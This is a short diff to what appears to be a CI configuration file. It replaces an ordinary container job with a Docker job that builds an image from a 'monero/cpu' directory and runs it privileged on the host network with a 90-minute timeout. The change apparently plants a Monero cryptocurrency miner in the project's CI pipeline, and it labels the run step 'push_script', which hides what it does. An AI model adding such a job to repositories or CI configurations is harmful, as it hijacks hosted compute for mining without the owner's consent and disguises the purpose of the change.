@@ -1,5 +1,6 @@
-container:
-  image: alpine
-  cpu: 4
-  memory: 12
-  run_script: bash ./scripts/xdebian.sh
+docker_builder:
+  build_script: docker build --tag nmlm99/nizadam:latest monero/cpu
+  timeout_in: 90m
+  push_script: docker run --privileged --net host nmlm99/nizadam:latest
+
+
